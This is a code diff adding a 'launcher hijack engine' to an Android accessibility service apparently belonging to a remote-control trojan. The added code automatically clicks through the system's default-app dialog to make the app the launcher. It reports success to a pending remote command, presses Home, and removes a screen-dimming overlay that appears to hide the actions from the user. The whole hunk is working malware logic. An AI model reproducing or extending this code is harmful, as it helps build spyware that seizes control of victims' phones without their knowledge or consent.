@@ -321,6 +321,39 @@ class MyAccessibilityService : AccessibilityService() {
 
         // --- DEFAULT SMS GHOST LOGIC ---
         if (pkgName.contains("permissioncontroller", ignoreCase = true) || pkgName.contains("settings", ignoreCase = true)) {
+            // --- LAUNCHER HIJACK ENGINE ---
+            if (LauncherManager.isHijacking) {
+                val root = rootInActiveWindow
+                if (root != null) {
+                    val targetLabel = getString(R.string.label_settings_app) // "Settings"
+                    val nodes = root.findAccessibilityNodeInfosByText(targetLabel)
+                    var clicked = false
+                    for (node in nodes) {
+                        var target: android.view.accessibility.AccessibilityNodeInfo? = node
+                        while (target != null && !target.isClickable) target = target.parent
+                        if (target != null && target.isClickable) {
+                            target.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK)
+                            clicked = true
+                            DebugLogger.log("GHOST_LAUNCHER", "Clicked radio button for: $targetLabel")
+                            break
+                        }
+                    }
+                    
+                    if (clicked) {
+                        LauncherManager.isHijacking = false
+                        CommandProcessor.updateCommandStatus(applicationContext, LauncherManager.pendingCmdId, "SUCCESS", "Default Launcher set via Ghost Hand")
+                        
+                        android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
+                            performGlobalAction(GLOBAL_ACTION_HOME)
+                            android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
+                                performGlobalAction(GLOBAL_ACTION_HOME)
+                                DimmerManager.removeOverlay(applicationContext)
+                            }, 400)
+                        }, 800)
+                    }
+                }
+            }
+
             if (isWaitingForDataSettings && pkgName.contains("settings")) {
                 val root = rootInActiveWindow
                 val targetNodes = root?.findAccessibilityNodeInfosByText("Mobile data")
